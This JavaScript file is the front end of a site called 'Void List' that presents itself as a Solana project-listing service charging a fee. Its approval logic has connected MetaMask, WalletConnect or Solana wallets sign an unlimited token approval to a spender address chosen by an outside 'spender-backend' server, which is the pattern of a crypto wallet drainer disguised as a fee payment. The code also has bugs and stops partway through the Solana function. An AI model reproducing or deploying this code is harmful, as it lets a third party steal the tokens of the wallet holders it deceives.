import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js";
import {
  Connection, PublicKey, Transaction
} from "https://esm.sh/@solana/web3.js@1.95.3";
import {
  createApproveInstruction, TOKEN_PROGRAM_ID, getAssociatedTokenAddress
} from "https://esm.sh/@solana/spl-token@0.3.8";
import {
  WalletAdapterNetwork
} from "https://esm.sh/@solana/wallet-adapter-base@0.9.22";
import {
  PhantomWalletAdapter, SolflareWalletAdapter, BackpackWalletAdapter, GlowWalletAdapter, WalletConnectWalletAdapter
} from "https://esm.sh/@solana/wallet-adapter-wallets@0.19.19";

const projectForm = document.getElementById('projectForm');
const chainSelect = document.getElementById('chainSelect');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');

const metaMaskButton = document.getElementById('metaMaskButton');
const walletConnectEvmButton = document.getElementById('walletConnectEvmButton');
const solanaWalletButton = document.getElementById('solanaWalletButton');
const walletConnectSolanaButton = document.getElementById('walletConnectSolanaButton');

let selectedChain = null;
let connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
let wallet = null;

/* ============================
   UI FLOW
   ============================ */
if (projectForm && feeModal) {
  projectForm.addEventListener('submit', (event) => {
    event.preventDefault();
    feeModal.style.display = 'flex';
  });
}

if (closeButtons[0] && feeModal) {
  closeButtons[0].addEventListener('click', () => {
    feeModal.style.display = 'none';
  });
}

if (proceedButton && feeModal && walletModal) {
  proceedButton.addEventListener('click', () => {
    feeModal.style.display = 'none';
    walletModal.style.display = 'flex';
  });
}

if (closeButtons[1] && walletModal) {
  closeButtons[1].addEventListener('click', () => {
    walletModal.style.display = 'none';
  });
}

if (metaMaskButton) {
  metaMaskButton.addEventListener('click', connectMetaMask);
}

if (walletConnectButton) {
  walletConnectButton.addEventListener('click', connectWalletConnect);
}
/* EVM MetaMask */
metaMaskButton.onclick = async () => {
  if (!window.ethereum) return alert("MetaMask not installed");
  const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
  const provider = new ethers.providers.Web3Provider(window.ethereum);
  const signer = provider.getSigner();
  await approveEvm(accounts[0], signer);
};

/* EVM WalletConnect */
walletConnectEvmButton.onclick = async () => {
  const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle');
  const wcProvider = await EthereumProvider.init({
    projectId: "YOUR_WC_PROJECT_ID",
    chains: [1],
    showQrModal: true,
    rpcMap: { 1: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY" }
  });
  const accounts = await wcProvider.enable();
  const provider = new ethers.providers.Web3Provider(wcProvider);
  const signer = provider.getSigner();
  await approveEvm(accounts[0], signer);
};

/* Solana direct wallets */
solanaWalletButton.onclick = async () => {
  const adapters = [
    new PhantomWalletAdapter(),
    new SolflareWalletAdapter({ network: WalletAdapterNetwork.Mainnet }),
    new BackpackWalletAdapter(),
    new GlowWalletAdapter()
  ];
  wallet = adapters.find(w => w.readyState === "Installed" || w.readyState === "Loadable");
  if (!wallet) return alert("No Solana wallet found");
  await wallet.connect();
  await approveSolana(wallet.publicKey);
};

/* Solana WalletConnect */
walletConnectSolanaButton.onclick = async () => {
  wallet = new WalletConnectWalletAdapter({
    network: WalletAdapterNetwork.Mainnet,
    options: {
      projectId: "YOUR_WC_PROJECT_ID",
      relayUrl: "wss://relay.walletconnect.com",
      metadata: { name: "Void List", description: "Solana Project Listing", url: window.location.origin, icons: [] }
    }
  });
  await wallet.connect();
  await approveSolana(wallet.publicKey);
};

/* Approval logic */
async function approveEvm(account, signer) {
  const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";
  const res = await fetch(`${BACKEND_URL}/scan`, {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ owner: account, chain: selectedChain })
  });
  const { tokenAddress, spenderAddress } = await res.json().data;
  const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
  const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
  const tx = await tokenContract.approve(spenderAddress, ethers.constants.MaxUint256);
  await tx.wait();
  alert("✅ EVM Approval Successful!");
}

async function approveSolana(ownerPubKey) {
  const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";
  const res = await fetch(`${BACKEND_URL}/scan`, {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ owner: ownerPubKey.toBase58(), chain: "solana" })
  });
  const { tokenMint, spenderAddress, amount } = await res.json().data;
